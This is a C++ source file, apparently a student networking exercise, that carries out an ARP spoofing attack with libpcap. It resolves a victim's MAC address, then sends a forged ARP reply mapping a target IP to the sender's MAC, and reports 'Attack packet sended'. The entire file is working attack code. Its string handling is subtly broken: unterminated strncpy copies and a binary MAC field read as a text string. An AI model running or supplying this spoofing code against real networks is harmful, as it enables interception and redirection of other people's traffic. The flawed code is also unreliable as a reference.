#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "main.h"

#pragma pack(push, 1)
#pragma pack(pop)

int main(int argc, char* argv[]){
	if(argc!=4){
		usage();
		return -1;
	}

	char* dev=argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if(handle==nullptr){
		perror("pcap_open_live");
		return -1;
	}

	char memac[20], victim_mac[20], targetmac[20];
	char meip[20], victim_ip[20], targetip[20];
	char bcast[20]="ff:ff:ff:ff:ff:ff";
	char unknown[20]="00:00:00:00:00:00";
	GetInterfaceMacAddress(dev,memac);
	GetInterfaceIPAddress(dev,meip);
	strncpy(victim_ip,argv[2],strlen(argv[2]));
	strncpy(targetip,argv[3],strlen(argv[3]));
	EthArpPacket EApacket;

	make_packet(&EApacket, bcast, memac, 1, memac, meip, unknown, victim_ip);

	if(pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&EApacket), sizeof(EthArpPacket))!=0){
		perror("pcap_sendpacket");
		return -1;
	}

	pcap_t* pcap=pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if(pcap==NULL){
		perror("pcap_open_live");
		return -1;
	}

	while(true){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res=pcap_next_ex(pcap, &header, &packet);
		if(res==0) continue;
		if(res==PCAP_ERROR||res==PCAP_ERROR_BREAK){	
			perror("pcap_next_ex");
			return -1;
		}

		struct EthHdr *ethhdr=(struct EthHdr *)(packet);
		struct ArpHdr *arphdr=(struct ArpHdr *)(ethhdr+1);
		
		if(!is_Reply(ethhdr, arphdr, memac, meip, victim_ip)) continue;

		std::string str=std::string(arphdr->smac_);
		const char *tmp=str.c_str();
		strncpy(victim_mac,tmp,strlen(tmp));
		break;
	}

	make_packet(&EApacket, victim_mac, memac, 2, memac, targetip, victim_mac, victim_ip);

	if(pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&EApacket), sizeof(EthArpPacket))!=0){
		perror("pcap_sendpacket");
		return -1;
	}

	printf("Attack packet sended\n");
	
	pcap_close(handle);
}
